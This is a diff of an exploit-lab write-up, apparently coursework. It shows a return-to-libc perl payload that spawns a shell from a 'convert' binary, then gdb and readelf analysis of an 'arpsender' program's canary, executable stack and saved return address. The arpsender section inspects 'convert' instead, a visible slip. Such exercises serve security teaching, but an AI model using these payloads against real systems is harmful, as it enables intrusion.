@@ -78,3 +78,59 @@ $1 = {<text variable, no debug info>} 0xb7ea1270 <exit>
 $ ./convert 1 $(perl -e 'print "\x90"x752 .  "\x30\xdc\xea\xb7"  . "\x70\x12\xea\xb7" . "\x94\xe1\xfa\xb7"')
 $ (unlocked shell)
 ````
+___
+#### `arpsender` C program
+###### Determine protections enabled
+* Canaries between buffers and control data in the stack
+```
+$ gdb convert
+(gdb) disas main
+   Dump of assembler code for function main:
+   0x08048793 <+0>:    	push   %ebp
+   .........  ....:     ....   ....
+   .........  ....:     ....   ....
+   0x080488e6 <+339>:	call   0x80484c0 <__stack_chk_fail@plt>
+   0x080488eb <+344>:	leave  
+   0x080488ec <+345>:	ret
+```
+`.........  ....: call 0x80484c0 <__stack_chk_fail@plt>` in the procedure epilogue indicates the presence of a canary. So we have one defensive mechanism to bypass.
+* Executable Stack Protection
+```
+$ readelf -l convert
+Elf file type is EXEC (Executable file)
+Entry point 0x8048550
+There are 8 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  ....           ......   ......     ......     ......  ......  . . ...
+```
+`GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE  0x4` this line indicated that the Stack is Read-Write and executable, so this defensive mechanism is disabled.
+````
+(gdb) break print_address
+(gdb) run packet.txt
+(gdb) x/x &i
+0xbffff454:	0x0804834c
+(gdb) x/x &hwaddr.len
+0xbffff458:	0xb7ee25d0
+(gdb) x/x &hwaddr.addr
+0xbffff459:	0xf3b7ee25
+(gdb) x/x &hwaddr.hwtype
+0xbffff4dc:	0x00000000
+(gdb) x/x &hwaddr.prototype
+0xbffff4e0:	0xbffff598
+(gdb) x/x &hwaddr.oper
+0xbffff4e4:	0xb7ff59c0
+(gdb) x/x &hwaddr.protolen
+0xbffff4e8:	0x00000065
+(gdb) info frame
+Stack level 0, frame at 0xbffff500:
+ eip = 0x804864e in print_address (arpsender.c:24); saved eip 0x80488c5
+ called by frame at 0xbffff5a0
+ source language c.
+ Arglist at 0xbffff4f8, args: packet=0x804a008 "\324ò\241\002"
+ Locals at 0xbffff4f8, Previous frame's sp is 0xbffff500
+ Saved registers:
+  ebp at 0xbffff4f8, eip at 0xbffff4fc
+````
